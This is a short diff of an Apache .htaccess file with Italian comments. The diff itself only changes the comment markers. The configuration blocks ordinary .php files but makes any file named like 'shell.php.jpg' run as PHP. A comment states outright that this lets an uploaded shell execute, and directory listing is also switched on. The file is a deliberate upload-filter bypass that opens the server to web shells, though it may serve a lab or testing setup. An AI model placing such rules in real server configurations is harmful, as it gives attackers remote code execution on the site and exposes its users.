@@ -1,13 +1,13 @@
-## Disabilita PHP per i file standard (opzionale, per forzare l'uso del bypass)
+# Disabilita PHP per i file standard (opzionale, per forzare l'uso del bypass)
 <FilesMatch "\.php$">
     Require all denied
 </FilesMatch>
 
-## Questo permette di caricare 'shell.php.jpg' e farlo eseguire dal server
+# Questo permette di caricare 'shell.php.jpg' e farlo eseguire dal server
 <FilesMatch "\.php\.(jpg|jpeg|png|gif)$">
     Require all granted
     SetHandler application/x-httpd-php
 </FilesMatch>
 
-## Opzionale: permette di vedere i file caricati
+# Opzionale: permette di vedere i file caricati
 Options +Indexes
